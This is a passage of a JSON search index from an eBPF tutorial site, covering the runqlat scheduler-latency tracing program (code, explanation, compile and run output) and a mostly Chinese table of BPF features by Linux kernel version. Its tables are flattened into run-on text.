next-&gt;comm);\nif (targ_ms)\n  delta /= 1000000U;\nelse\n  delta /= 1000U;\nslot = log2l(delta);\nif (slot &gt;= MAX_SLOTS)\n  slot = MAX_SLOTS - 1;\n__sync_fetch_and_add(&amp;histp-&gt;slots[slot], 1);\n\ncleanup:\nbpf_map_delete_elem(&amp;start, &amp;pid);\nreturn 0;\n}\n\nSEC(\"raw_tp/sched_wakeup\")\nint BPF_PROG(handle_sched_wakeup, struct task_struct *p)\n{\n if (filter_cg &amp;&amp; !bpf_current_task_under_cgroup(&amp;cgroup_map, 0))\n  return 0;\n\n return trace_enqueue(BPF_CORE_READ(p, tgid), BPF_CORE_READ(p, pid));\n}\n\nSEC(\"raw_tp/sched_wakeup_new\")\nint BPF_PROG(handle_sched_wakeup_new, struct task_struct *p)\n{\n if (filter_cg &amp;&amp; !bpf_current_task_under_cgroup(&amp;cgroup_map, 0))\n  return 0;\n\n return trace_enqueue(BPF_CORE_READ(p, tgid), BPF_CORE_READ(p, pid));\n}\n\nSEC(\"raw_tp/sched_switch\")\nint BPF_PROG(handle_sched_switch, bool preempt, struct task_struct *prev, struct task_struct *next)\n{\n return handle_switch(preempt, prev, next);\n}\n\nchar LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre>"},{"location":"tutorials/9-runqlat/#constants-and-global-variables","title":"Constants and Global Variables","text":"<p>The code defines several constants and volatile global variables used for filtering corresponding tracing targets. These variables include:</p> <pre><code>#define MAX_ENTRIES 10240\n#define TASK_RUNNING  0\n\nconst volatile bool filter_cg = false;\nconst volatile bool targ_per_process = false;\nconst volatile bool targ_per_thread = false;\nconst volatile bool targ_per_pidns = false;\nconst volatile bool targ_ms = false;\nconst volatile pid_t targ_tgid = 0;\n</code></pre> <ul> <li><code>MAX_ENTRIES</code>: The maximum number of map entries.</li> <li><code>TASK_RUNNING</code>: The task status value.</li> <li><code>filter_cg</code>, <code>targ_per_process</code>, <code>targ_per_thread</code>, <code>targ_per_pidns</code>, <code>targ_ms</code>, <code>targ_tgid</code>: Boolean variables for filtering and target options. These options can be set by user-space programs to customize the behavior of the eBPF program.</li> </ul>"},{"location":"tutorials/9-runqlat/#ebpf-maps","title":"eBPF Maps","text":"<p>The code defines several eBPF maps including:</p> <pre><code>struct {\n __uint(type, BPF_MAP_TYPE_CGROUP_ARRAY);\n __type(key, u32);\n __type(value, u32);\n __uint(max_entries, 1);\n} cgroup_map SEC(\".maps\");\n\nstruct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, MAX_ENTRIES);\n __type(key, u32);\n __type(value, u64);\n} start SEC(\".maps\");\n\nstatic struct hist zero;\n\nstruct {\n __uint(type, BPF_MAP_TYPE_HASH);\n __uint(max_entries, MAX_ENTRIES);\n __type(key, u32);\n __type(value, struct hist);\n} hists SEC(\".maps\");\n</code></pre> <ul> <li><code>cgroup_map</code>: A cgroup array map used for filtering cgroups.</li> <li><code>start</code>: A hash map used to store timestamps when processes are enqueued.</li> <li><code>hists</code>: A hash map used to store histogram data for recording process scheduling delays.</li> </ul>"},{"location":"tutorials/9-runqlat/#helper-functions","title":"Helper Functions","text":"<p>The code includes two helper functions:</p> <ul> <li><code>trace_enqueue</code>: This function is used to record the timestamp when a process is enqueued. It takes the <code>tgid</code> and <code>pid</code> values as parameters. If the <code>pid</code> value is 0 or the <code>targ_tgid</code> value is not 0 and not equal to <code>tgid</code>, the function returns 0. Otherwise, it retrieves the current timestamp using <code>bpf_ktime_get_ns</code> and updates the <code>start</code> map with the <code>pid</code> key and the timestamp value.</li> </ul> <pre><code>static int trace_enqueue(u32 tgid, u32 pid)\n{\n u64 ts;\n\n if (!pid)\n  return 0;\n if (targ_tgid &amp;&amp; targ_tgid != tgid)\n  return 0;\n\n ts = bpf_ktime_get_ns();\n bpf_map_update_elem(&amp;start, &amp;pid, &amp;ts, BPF_ANY);\n return 0;\n}\n</code></pre> <ul> <li><code>pid_namespace</code>: This function is used to get the PID namespace of a process. It takes a <code>task_struct</code> pointer as a parameter and returns the PID namespace of the process. The function retrieves the PID namespace by following <code>task_active_pid_ns()</code> and <code>pid-&gt;numbers[pid-&gt;level].ns</code>.</li> </ul> <pre><code>static unsigned int pid_namespace(struct task_struct *task)\n{\n struct pid *pid;\n unsigned int level;\n struct upid upid;\n unsigned int inum;\n\n /*  get the pid namespace by following task_active_pid_ns(),\n  *  pid-&gt;numbers[pid-&gt;level].ns\n  */\n pid = BPF_CORE_READ(task, thread_pid);\n level = BPF_CORE_READ(pid, level);\n bpf_core_read(&amp;upid, sizeof(upid), &amp;pid-&gt;numbers[level]);\n inum = BPF_CORE_READ(upid.ns, ns.inum);\n\n return inum;\n}\n</code></pre> <p>The <code>handle_switch</code> function is the core part, used to handle scheduling switch events, calculate process scheduling latency, and update histogram data:</p> <pre><code>static int handle_switch(bool preempt, struct task_struct *prev, struct task_struct *next)\n{\n ...\n}\n</code></pre> <p>Firstly, the function determines whether to filter cgroup based on the setting of <code>filter_cg</code>. Then, if the previous process state is <code>TASK_RUNNING</code>, the <code>trace_enqueue</code> function is called to record the enqueue time of the process. Then, the function looks up the enqueue timestamp of the next process. If it is not found, it returns directly. The scheduling latency (delta) is calculated, and the key for the histogram map (hkey) is determined based on different options (targ_per_process, targ_per_thread, targ_per_pidns). Then, the histogram map is looked up or initialized, and the histogram data is updated. Finally, the enqueue timestamp record of the process is deleted.</p> <p>Next is the entry point of the eBPF program. The program uses three entry points to capture different scheduling events:</p> <ul> <li><code>handle_sched_wakeup</code>: Used to handle the <code>sched_wakeup</code> event triggered when a process is woken up from sleep state.</li> <li><code>handle_sched_wakeup_new</code>: Used to handle the <code>sched_wakeup_new</code> event triggered when a newly created process is woken up.</li> <li><code>handle_sched_switch</code>: Used to handle the <code>sched_switch</code> event triggered when the scheduler selects a new process to run.</li> </ul> <p>These entry points handle different scheduling events, but all call the <code>handle_switch</code> function to calculate the scheduling latency of the process and update the histogram data.</p> <p>Finally, the program includes a license declaration:</p> <pre><code>char LICENSE[] SEC(\"license\") = \"GPL\";\n</code></pre> <p>This declaration specifies the license type of the eBPF program, which is \"GPL\" in this case. This is required for many kernel features as they require eBPF programs to follow the GPL license.</p>"},{"location":"tutorials/9-runqlat/#runqlath","title":"runqlat.h","text":"<p>Next, we need to define a header file <code>runqlat.h</code> for handling events reported from kernel mode to user mode:</p> <pre><code>/* SPDX-License-Identifier: (LGPL-2.1 OR BSD-2-Clause) */\n#ifndef __RUNQLAT_H\n#define __RUNQLAT_H\n\n#define TASK_COMM_LEN 16\n#define MAX_SLOTS 26\n\nstruct hist {\n    __u32 slots[MAX_SLOTS];\n    char comm[TASK_COMM_LEN];\n};\n\n#endif /* __RUNQLAT_H */\n</code></pre>"},{"location":"tutorials/9-runqlat/#compilation-and-execution","title":"Compilation and Execution","text":"<p>We will use <code>eunomia-bpf</code> to compile and run this example. You can refer to https://github.com/eunomia-bpf/eunomia-bpf to download and install the <code>ecc</code> compilation toolkit and <code>ecli</code> runtime.</p> <p>Compile:</p> <pre><code>docker run -it -v `pwd`/:/src/ ghcr.io/eunomia-bpf/ecc-`uname -m`:latest\n</code></pre> <p>or</p> <pre><code>$ ecc runqlat.bpf.c runqlat.h\nCompiling bpf object...\nGenerating export types...\nPacking ebpf object and config into package.json...\n</code></pre> <p>Run:</p> <pre><code>$ sudo ecli run examples/bpftools/runqlat/package.json -h\nUsage: runqlat_bpf [--help] [--version] [--verbose] [--filter_cg] [--targ_per_process] [--targ_per_thread] [--targ_per_pidns] [--targ_ms] [--targ_tgid VAR]\n\nA simple eBPF program\n\nOptional arguments:\n-h, --help            shows help message and exits \n-v, --version         prints version information and exits \n--verbose             prints libbpf debug information \n--filter_cg           set value of bool variable filter_cg \n--targ_per_process    set value of bool variable targ_per_process \n--targ_per_thread     set value of bool variable targ_per_thread \n--targ_per_pidns      set value of bool variable targ_per_pidns \n--targ_ms             set value of bool variable targ_ms \n--targ_tgid           set value of pid_t variable targ_tgid \n\n$ sudo ecli run examples/bpftools/runqlat/package.json\nkey =  4294967295\ncomm = rcu_preempt\n\n     (unit)              : count    distribution\n         0 -&gt; 1          : 9        |****                                    |\n         2 -&gt; 3          : 6        |**                                      |\n         4 -&gt; 7          : 12       |*****                                   |\n         8 -&gt; 15         : 28       |*************                           |\n        16 -&gt; 31         : 40       |*******************                     |\n        32 -&gt; 63         : 83       |****************************************|\n        64 -&gt; 127        : 57       |***************************             |\n       128 -&gt; 255        : 19       |*********                               |\n       256 -&gt; 511        : 11       |*****                                   |\n       512 -&gt; 1023       : 2        |                                        |\n      1024 -&gt; 2047       : 2        |                                        |\n      2048 -&gt; 4095       : 0        |                                        |\n      4096 -&gt; 8191       : 0        |                                        |\n      8192 -&gt; 16383      : 0        |                                        |\n     16384 -&gt; 32767      : 1        |                                        |\n\n$ sudo ecli run examples/bpftools/runqlat/package.json --targ_per_process\nkey = 3189\ncomm = cpptools\n\n     (unit)              : count    distribution\n         0 -&gt; 1          : 0        |                                        |\n         2 -&gt; 3          : 0        |                                        |\n         4 -&gt; 7          : 0        |                                        |\n         8 -&gt; 15         : 1        |***                                     |\n        16 -&gt; 31         : 2        |*******                                 |\n        32 -&gt; 63         : 11       |****************************************|\n        64 -&gt; 127        : 8        |*****************************           |\n       128 -&gt; 255        : 3        |**********                              |\n</code></pre> <p>Complete source code can be found at: https://github.com/eunomia-bpf/bpf-developer-tutorial/tree/main/src/9-runqlat</p> <p>References:</p> <ul> <li>https://www.brendangregg.com/blog/2016-10-08/linux-bcc-runqlat.html</li> <li>https://github.com/iovisor/bcc/blob/master/libbpf-tools/runqlat.c</li> </ul>"},{"location":"tutorials/9-runqlat/#summary","title":"Summary","text":"<p>runqlat is a Linux kernel BPF program that summarizes scheduler run queue latency using a bar chart to show the length of time tasks wait to run on a CPU. To compile this program, you can use the <code>ecc</code> tool and to run it, you can use the <code>ecli</code> command.</p> <p>runqlat is a tool for monitoring process scheduling latency in the Linux kernel. It can help you understand the time processes spend waiting to run in the kernel and optimize process scheduling based on this information to improve system performance. The original source code can be found in libbpf-tools: https://github.com/iovisor/bcc/blob/master/libbpf-tools/runqlat.bpf.c</p> <p>If you want to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or website https://eunomia.dev/tutorials/ for more examples and complete tutorials.</p> <p>Share on  Share on </p>"},{"location":"tutorials/bcc-documents/kernel-versions/","title":"Linux \u5185\u6838\u7248\u672c\u7684 BPF \u529f\u80fd","text":""},{"location":"tutorials/bcc-documents/kernel-versions/#ebpf","title":"eBPF\u652f\u6301","text":"\u5185\u6838\u7248\u672c \u63d0\u4ea4 3.15 <code>bd4cf0ed331a</code>"},{"location":"tutorials/bcc-documents/kernel-versions/#jit","title":"JIT\u7f16\u8bd1","text":"<p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u83b7\u53d6\u5185\u6838\u652f\u6301\u7684\u4f53\u7cfb\u7ed3\u6784\u5217\u8868\uff1a</p> <pre><code>git grep HAVE_EBPF_JIT arch/\n</code></pre> \u529f\u80fd / \u4f53\u7cfb\u7ed3\u6784 \u5185\u6838\u7248\u672c \u63d0\u4ea4 x86_64 3.16 <code>622582786c9e</code> ARM64 3.18 <code>e54bcde3d69d</code> s390 4.1 <code>054623105728</code> JIT\u673a\u5668\u7684\u5e38\u91cf\u6df7\u6dc6 4.7 <code>4f3446bb809f</code> PowerPC64 4.8 <code>156d0e290e96</code> \u5e38\u91cf\u6df7\u6dc6 - PowerPC64 4.9 <code>b7b7013cac55</code> Sparc64 4.12 <code>7a12b5031c6b</code> MIPS 4.13 <code>f381bf6d82f0</code> ARM32 4.14 <code>39c13c204bb1</code> x86_32 4.18 <code>03f5781be2c7</code> RISC-V RV64G 5.1 <code>2353ecc6f91f</code>RISC-V RV32G PowerPC32 5.13 <code>51c66ad849a7</code> LoongArch 6.1 <code>5dc615520c4d</code>"},{"location":"tutorials/bcc-documents/kernel-versions/#_1","title":"\u4e3b\u8981\u7279\u6027","text":"<p>\u5176\u4e2d\u51e0\u4e2a\uff08\u4f46\u4e0d\u662f\u5168\u90e8\uff09\u4e3b\u8981\u7279\u6027 \u53ef\u4ee5\u8f6c\u6362\u4e3a eBPF \u7a0b\u5e8f\u7c7b\u578b\u3002 \u60a8\u7684\u5185\u6838\u652f\u6301\u7684\u6b64\u7c7b\u7a0b\u5e8f\u7c7b\u578b\u7684\u5217\u8868\u53ef\u4ee5\u5728\u6587\u4ef6 <code>include/uapi/linux/bpf.h</code> \u4e2d\u627e\u5230\uff1a</p> <pre><code>git grep -W 'bpf_prog_type {' include/uapi/linux/bpf.h\n</code></pre> \u7279\u6027 \u5185\u6838\u7248\u672c \u63d0\u4ea4 <code>AF_PACKET</code> (libpcap/tcpdump, <code>cls_bpf</code> \u5206\u7c7b\u5668, netfilter \u7684 <code>xt_bpf</code>, team \u9a71\u52a8\u7a0b\u5e8f\u7684\u8d1f\u8f7d\u5747\u8861\u6a21\u5f0f\u2026) 3.15 <code>bd4cf0ed331a</code> \u5185\u6838\u52a9\u624b 3.15 <code>bd4cf0ed331a</code> <code>bpf()</code> \u7cfb\u7edf\u8c03\u7528 3.18 <code>99c55f7d47c0</code> Maps (\u53c8\u540d \u8868; \u8be6\u89c1\u4e0b\u6587) 3.18 <code>99c55f7d47c0</code> BPF \u9644\u52a0\u5230\u5957\u63a5\u5b57 3.19 <code>89aa075832b0</code> BPF \u9644\u52a0\u5230 <code>kprobes</code> 4.1 <code>2541517c32be</code> <code>cls_bpf</code> / <code>act_bpf</code> \u7528\u4e8e <code>tc</code> 4.1 <code>e2e9b6541dd4</code> \u5c3e\u8c03\u7528 4.2 <code>04fd61ab36ec</code>\u975e\u6839\u7a0b\u5e8f\u4e0a\u7684\u5957\u63a5\u5b57 \u6301\u4e45\u6620\u5c04\u548c\u7a0b\u5e8f\uff08\u865a\u62df\u6587\u4ef6\u7cfb\u7edf\uff09 4.4 <code>b2197755b263</code> <code>tc</code>\u7684<code>direct-action</code>(<code>da</code>)\u6a21\u5f0f 4.4 <code>045efa82ff56</code> <code>tc</code>\u7684<code>clsact</code>qdisc 4.5 <code>1f211a1b929c</code> BPF\u8fde\u63a5\u5230\u8ddf\u8e2a\u70b9 4.7 <code>98b5c2c65c29</code> \u76f4\u63a5\u6570\u636e\u5305\u8bbf\u95ee 4.7 <code>969bf05eb3ce</code> XDP\uff08\u53c2\u89c1\u4e0b\u6587\uff09 4.8 <code>6a773a15a1e8</code> BPF\u8fde\u63a5\u5230\u6027\u80fd\u4e8b\u4ef6 4.9 <code>0515e5999a46</code> <code>tc</code>\u7684<code>cls_bpf</code>\u7684\u786c\u4ef6\u5378\u8f7d 4.9 <code>332ae8e2f6ec</code> \u9a8c\u8bc1\u5668\u66b4\u9732\u548c\u5185\u90e8\u94a9\u5b50 4.9 <code>13a27dfc6697</code> BPF\u8fde\u63a5\u5230 cgroups \u7528\u4e8e\u5957\u63a5\u5b57\u8fc7\u6ee4 4.10 <code>0e33661de493</code> \u8f7b\u91cf\u7ea7\u96a7\u9053\u5c01\u88c5 4.10 <code>3a0af8fd61f9</code> eBPF\u5bf9<code>xt_bpf</code>\u6a21\u5757\uff08iptables\uff09\u7684\u652f\u6301 4.10 <code>2c16d6033264</code> BPF\u7a0b\u5e8f\u6807\u7b7e 4.10 <code>7bd509e311f4</code>\u8ddf\u8e2a\u70b9\u4ee5\u8c03\u8bd5BPF \u6d4b\u8bd5/\u57fa\u51c6\u6d4b\u8bd5BPF\u7a0b\u5e8f 4.12 <code>1cf1cae963c2</code> BPF\u7a0b\u5e8f\u548c\u6620\u5c04ID 4.13 <code>dc4bb0e23561</code> BPF\u5bf9<code>sock_ops</code>\u7684\u652f\u6301 4.13 <code>40304b2a1567</code> BPF\u5bf9\u5957\u63a5\u5b57\u4e0a\u7684skb\u7684\u652f\u6301 4.14 <code>b005fd189cec</code> \u5185\u6838\u6e90\u7801\u4e2d\u7684bpftool\u5b9e\u7528\u7a0b\u5e8f 4.15 <code>71bb428fe2c1</code> BPF\u9644\u52a0\u5230cgroups\u4f5c\u4e3a\u8bbe\u5907\u63a7\u5236\u5668 4.15 <code>ebc614f68736</code> bpf2bpf\u51fd\u6570\u8c03\u7528 4.16 <code>cc8b0b92a169</code> BPF\u7528\u4e8e\u76d1\u89c6\u5957\u63a5\u5b57RX/TX\u6570\u636e 4.17 <code>4f738adba30a</code> BPF\u9644\u52a0\u5230\u539f\u59cb\u8ddf\u8e2a\u70b9 4.17 <code>c4f6699dfcb8</code> BPF\u9644\u52a0\u5230<code>bind()</code>\u7cfb\u7edf\u8c03\u7528 4.17 <code>4fbac77d2d09</code> <code>aac3fc320d94</code> BPF\u9644\u52a0\u5230<code>connect()</code>\u7cfb\u7edf\u8c03\u7528 4.17 <code>d74bad4e74ee</code>BPF \u7c7b\u578b\u683c\u5f0f\uff08BTF\uff09 AF_XDP 4.18 <code>fbfc504a24f5</code> bpfilter 4.18 <code>d2ba09c17a06</code> seg6local LWT \u7684 End.BPF \u64cd\u4f5c 4.18 <code>004d4b274e2a</code> BPF \u9644\u52a0\u5230 LIRC \u8bbe\u5907 4.18 <code>f4364dcfc86d</code> \u5c06\u6620\u5c04\u503c\u4f20\u9012\u7ed9\u6620\u5c04\u52a9\u624b 4.18 <code>d71962f3e627</code> BPF \u5957\u63a5\u5b57\u590d\u7528\u7aef\u53e3 4.19 <code>2dbb9b9e6df6</code> BPF \u6d41\u89e3\u5256\u5668 4.20 <code>d58e468b1112</code> BPF 1M \u6307\u4ee4\u9650\u5236 5.2 <code>c04c0d2b968a</code> BPF \u63a7\u5236\u7ec4 sysctl 5.2 <code>7b146cebe30c</code> BPF \u539f\u59cb\u8ddf\u8e2a\u70b9\u53ef\u5199 5.2 <code>9df1c28bb752</code> BPF \u6709\u754c\u5faa\u73af 5.3 <code>2589726d12a1</code> BPF \u8df3\u677f 5.5 <code>fec56f5890d9</code> BPF LSM \u94a9\u5b50 5.7 <code>fc611f47f218</code> <code>641cd7b06c91</code> BPF \u8fed\u4ee3\u5668 5.8 <code>180139dca8b3</code>BPF\u5957\u63a5\u5b57\u67e5\u627e\u6302\u94a9 \u53ef\u7761\u7720\u7684BPF\u7a0b\u5e8f 5.10 <code>1e6c62a88215</code>"},{"location":"tutorials/bcc-documents/kernel-versions/#_2","title":"\u7a0b\u5e8f\u7c7b\u578b","text":"\u7a0b\u5e8f\u7c7b\u578b \u5185\u6838\u7248\u672c \u63d0\u4ea4 \u679a\u4e3e \u5957\u63a5\u5b57\u8fc7\u6ee4\u5668 3.19 <code>ddd872bc3098</code> BPF_PROG_TYPE_SOCKET_FILTER Kprobe 4.1 <code>2541517c32be</code> BPF_PROG_TYPE_KPROBE \u6d41\u91cf\u63a7\u5236(TC) 4.1 <code>96be4325f443</code> BPF_PROG_TYPE_SCHED_CLS \u6d41\u91cf\u63a7\u5236(TC) 4.1 <code>94caee8c312d</code> BPF_PROG_TYPE_SCHED_ACT \u8ddf\u8e2a\u70b9 4.7 <code>98b5c2c65c29</code> BPF_PROG_TYPE_TRACEPOINT XDP 4.8 <code>6a773a15a1e8</code> BPF_PROG_TYPE_XDP \u6027\u80fd\u4e8b\u4ef6 4.9 <code>0515e5999a46</code> BPF_PROG_TYPE_PERF_EVENT cgroup\u5957\u63a5\u5b57\u8fc7\u6ee4 4.10 <code>0e33661de493</code> BPF_PROG_TYPE_CGROUP_SKB cgroup\u5957\u63a5\u5b57\u4fee\u6539 4.10 <code>610236587600</code> BPF_PROG_TYPE_CGROUP_SOCK \u8f7b\u91cf\u7ea7\u96a7\u9053(IN) 4.10 <code>3a0af8fd61f9</code> BPF_PROG_TYPE_LWT_IN\".lightweight tunnel (OUT) \u8f7b\u91cf\u7ea7\u96a7\u9053 (OUT) 4.10 <code>3a0af8fd61f9</code> BPF_PROG_TYPE_LWT_OUT <p>lightweight tunnel (XMIT)      | 4.10 | <code>3a0af8fd61f9</code> | BPF_PROG_TYPE_LWT_XMIT \u8f7b\u91cf\u7ea7\u96a7\u9053 (XMIT)         | 4.10 | <code>3a0af8fd61f9</code> | BPF_PROG_TYPE_LWT_XMIT</p> <p>cgroup sock ops (per conn)     | 4.13 | <code>40304b2a1567</code> | BPF_PROG_TYPE_SOCK_OPS cgroup sock\u64cd\u4f5c (\u6bcf\u4e2a\u8fde\u63a5)   | 4.13 | <code>40304b2a1567</code> | BPF_PROG_TYPE_SOCK_OPS</p> <p>stream parser / stream verdict | 4.14 | <code>b005fd189cec</code> | BPF_PROG_TYPE_SK_SKB \u6d41\u5206\u6790\u5668 / \u6d41\u5224\u5b9a     | 4.14 | <code>b005fd189cec</code> | BPF_PROG_TYPE_SK_SKB</p> <p>cgroup device manager          | 4.15 | <code>ebc614f68736</code> | BPF_PROG_TYPE_CGROUP_DEVICE cgroup\u8bbe\u5907\u7ba1\u7406\u5668          | 4.15 | <code>ebc614f68736</code> | BPF_PROG_TYPE_CGROUP_DEVICE</p> <p>socket msg verdict             | 4.17 | <code>4f738adba30a</code> | BPF_PROG_TYPE_SK_MSG \u5957\u63a5\u5b57\u6d88\u606f\u5224\u5b9a         | 4.17 | <code>4f738adba30a</code> | BPF_PROG_TYPE_SK_MSG</p> <p>Raw tracepoint                 | 4.17 | <code>c4f6699dfcb8</code> | BPF_PROG_TYPE_RAW_TRACEPOINT \u88f8\u8ddf\u8e2a\u70b9         | 4.17 | <code>c4f6699dfcb8</code> | BPF_PROG_TYPE_RAW_TRACEPOINT</p> <p>socket binding                 | 4.17 | <code>4fbac77d2d09</code> | BPF_PROG_TYPE_CGROUP_SOCK_ADDR \u5957\u63a5\u5b57\u7ed1\u5b9a         | 4.17 | <code>4fbac77d2d09</code> | BPF_PROG_TYPE_CGROUP_SOCK_ADDR</p> <p>LWT seg6local                  | 4.18 | <code>004d4b274e2a</code> | BPF_PROG_TYPE_LWT_SEG6LOCAL \u8f7b\u91cf\u7ea7\u96a7\u9053seg6local          | 4.18 | <code>004d4b274e2a</code> | BPF_PROG_TYPE_LWT_SEG6LOCAL</p> <p>lirc devices                   | 4.18 | <code>f4364dcfc86d</code> | BPF_PROG_TYPE_LIRC_MODE2 lirc\u8bbe\u5907          | 4.18 | <code>f4364dcfc86d</code> | BPF_PROG_TYPE_LIRC_MODE2</p> <p>lookup SO_REUSEPORT socket     | 4.19 | <code>2dbb9b9e6df6</code> | BPF_PROG_TYPE_SK_REUSEPORT \u67e5\u627eSO_REUSEPORT\u5957\u63a5\u5b57   | 4.19 | <code>2dbb9b9e6df6</code> | BPF_PROG_TYPE_SK_REUSEPORT</p> <p>flow dissector                 | 4.20 | <code>d58e468b1112</code> | BPF_PROG_TYPE_FLOW_DISSECTOR \u6d41\u89e3\u6790\u5668         | 4.20 | <code>d58e468b1112</code> | BPF_PROG_TYPE_FLOW_DISSECTORcgroup sysctl                  | 5.2  | <code>7b146cebe30c</code> | BPF_PROG_TYPE_CGROUP_SYSCTL \u53ef\u63a7 cgroup                  | 5.2  | <code>7b146cebe30c</code> | BPF_PROG_TYPE_CGROUP_SYSCTL</p> <p>writable raw tracepoints       | 5.2  | <code>9df1c28bb752</code> | BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE \u53ef\u5199\u539f\u59cb\u8ddf\u8e2a\u70b9       | 5.2  | <code>9df1c28bb752</code> | BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE</p> <p>cgroup getsockopt/setsockopt   | 5.3  | <code>0d01da6afc54</code> | BPF_PROG_TYPE_CGROUP_SOCKOPT cgroup getsockopt/setsockopt   | 5.3  | <code>0d01da6afc54</code> | BPF_PROG_TYPE_CGROUP_SOCKOPT</p> <p>Tracing (BTF/BPF trampoline)   | 5.5  | <code>f1b9509c2fb0</code> | BPF_PROG_TYPE_TRACING \u8ffd\u8e2a (BTF/BPF \u5f39\u8df3)   | 5.5  | <code>f1b9509c2fb0</code> | BPF_PROG_TYPE_TRACING</p> <p>struct ops                     | 5.6  | <code>27ae7997a661</code> | BPF_PROG_TYPE_STRUCT_OPS \u7ed3\u6784\u64cd\u4f5c                     | 5.6  | <code>27ae7997a661</code> | BPF_PROG_TYPE_STRUCT_OPS</p> <p>extensions                     | 5.6  | <code>be8704ff07d2</code> | BPF_PROG_TYPE_EXT \u6269\u5c55                     | 5.6  | <code>be8704ff07d2</code> | BPF_PROG_TYPE_EXT</p> <p>LSM                            | 5.7  | <code>fc611f47f218</code> | BPF_PROG_TYPE_LSM LSM (Linux\u5b89\u5168\u6a21\u5757)                            | 5.7  | <code>fc611f47f218</code> | BPF_PROG_TYPE_LSM</p> <p>lookup listening socket        | 5.9  | <code>e9ddbb7707ff</code> | BPF_PROG_TYPE_SK_LOOKUP \u67e5\u8be2\u76d1\u542c\u5957\u63a5\u5b57        | 5.9  | <code>e9ddbb7707ff</code> | BPF_PROG_TYPE_SK_LOOKUP</p> <p>Allow executing syscalls       | 5.15 | <code>79a7f8bdb159</code> | BPF_PROG_TYPE_SYSCALL \u5141\u8bb8\u6267\u884c\u7cfb\u7edf\u8c03\u7528       | 5.15 | <code>79a7f8bdb159</code> | BPF_PROG_TYPE_SYSCALL</p>"},{"location":"tutorials/bcc-documents/kernel-versions/#map-types-aka-bcc","title":"Map types (a.k.a. \u8868\u683c, \u5728 BCC \u672f\u8bed\u4e2d)","text":""},{"location":"tutorials/bcc-documents/kernel-versions/#map","title":"Map \u7c7b\u578b","text":"<p>\u60a8\u5185\u6838\u652f\u6301\u7684 Map \u7c7b\u578b\u5217\u8868\u53ef\u4ee5\u5728\u6587\u4ef6 <code>include/uapi/linux/bpf.h</code> \u4e2d\u627e\u5230:</p> <pre><code>git grep -W 'bpf_map_type {' include/uapi/linux/bpf.h\n</code></pre> Map \u7c7b\u578b \u5185\u6838\u7248\u672c \u63d0\u4ea4 \u679a\u4e3e \u54c8\u5e0c 3.19 <code>0f8e4bd8a1fc</code> BPF_MAP_TYPE_HASH\".Array Prog array 4.2 <code>04fd61ab36ec</code> BPF_MAP_TYPE_PROG_ARRAY Perf events 4.3 <code>ea317b267e9d</code> BPF_MAP_TYPE_PERF_EVENT_ARRAY Per-CPU hash 4.6 <code>824bd0ce6c7c</code> BPF_MAP_TYPE_PERCPU_HASH Per-CPU array 4.6 <code>a10423b87a7e</code> BPF_MAP_TYPE_PERCPU_ARRAY Stack trace 4.6 <code>d5a3b1f69186</code> BPF_MAP_TYPE_STACK_TRACE cgroup array 4.8 <code>4ed8ec521ed5</code> BPF_MAP_TYPE_CGROUP_ARRAY LRU hash 4.10 <code>29ba732acbee</code> <code>3a08c2fd7634</code> BPF_MAP_TYPE_LRU_HASH LRU per-CPU hash 4.10 <code>8f8449384ec3</code> <code>961578b63474</code> BPF_MAP_TYPE_LRU_PERCPU_HASH LPM trie (longest-prefix match) 4.11 <code>b95a5c4db09b</code> BPF_MAP_TYPE_LPM_TRIE Array of maps 4.12 <code>56f668dfe00d</code> BPF_MAP_TYPE_ARRAY_OF_MAPSHash of maps Netdevice references (array) 4.14 <code>546ac1ffb70d</code> BPF_MAP_TYPE_DEVMAP Socket references (array) 4.14 <code>174a79ff9515</code> BPF_MAP_TYPE_SOCKMAP CPU references 4.15 <code>6710e1126934</code> BPF_MAP_TYPE_CPUMAP AF_XDP socket (XSK) references 4.18 <code>fbfc504a24f5</code> BPF_MAP_TYPE_XSKMAP Socket references (hashmap) 4.18 <code>81110384441a</code> BPF_MAP_TYPE_SOCKHASH cgroup storage 4.19 <code>de9cbbaadba5</code> BPF_MAP_TYPE_CGROUP_STORAGE reuseport sockarray 4.19 <code>5dc4c4b7d4e8</code> BPF_MAP_TYPE_REUSEPORT_SOCKARRAY precpu cgroup storage 4.20 <code>b741f1630346</code> BPF_MAP_TYPE_PERCPU_CGROUP_STORAGE queue 4.20 <code>f1a2e44a3aec</code> BPF_MAP_TYPE_QUEUE stack 4.20 <code>f1a2e44a3aec</code> BPF_MAP_TYPE_STACK socket local storage 5.2 <code>6ac99e8f23d4</code> BPF_MAP_TYPE_SK_STORAGENetdevice references (hashmap) struct ops 5.6 85d33df357b6 BPF_MAP_TYPE_STRUCT_OPS ring buffer 5.8 457f44363a88 BPF_MAP_TYPE_RINGBUF inode storage 5.10 8ea636848aca BPF_MAP_TYPE_INODE_STORAGE task storage 5.11 4cf1bc1f1045 BPF_MAP_TYPE_TASK_STORAGE Bloom filter 5.16 9330986c0300 BPF_MAP_TYPE_BLOOM_FILTER user ringbuf 6.1 583c1f420173 BPF_MAP_TYPE_USER_RINGBUF"},{"location":"tutorials/bcc-documents/kernel-versions/#map-userspace-api","title":"Map userspace API","text":"<p>Some (but not all) of these API features translate to a subcommand beginning with <code>BPF_MAP_</code>. The list of subcommands supported in your kernel can be found in file include/uapi/linux/bpf.h:</p> <pre><code>git grep -W 'bpf_cmd {' include/uapi/linux/bpf.h\n</code></pre> Feature Kernel version Commit Basic operations (lookup, update, delete, <code>GET_NEXT_KEY</code>) 3.18 db20fd2b0108 Pass flags to <code>UPDATE_ELEM</code> 3.19 3274f52073d8 Pre-alloc map memory by default 4.6 6c9059817432\u4f20\u9012<code>NULL</code>\u7ed9<code>GET_NEXT_KEY</code> \u521b\u5efa: \u9009\u62e9NUMA\u8282\u70b9 4.14 <code>96eabe7a40aa</code> \u9650\u5236\u4ece\u7cfb\u7edf\u8c03\u7528\u65b9\u9762\u7684\u8bbf\u95ee 4.15 <code>6e71b04a8224</code> \u521b\u5efa: \u6307\u5b9a\u6620\u5c04\u540d\u79f0 4.15 <code>ad5b177bd73f</code> <code>LOOKUP_AND_DELETE_ELEM</code> 4.20 <code>bd513cd08f10</code> \u521b\u5efa: <code>BPF_F_ZERO_SEED</code> 5.0 <code>96b3b6c9091d</code> 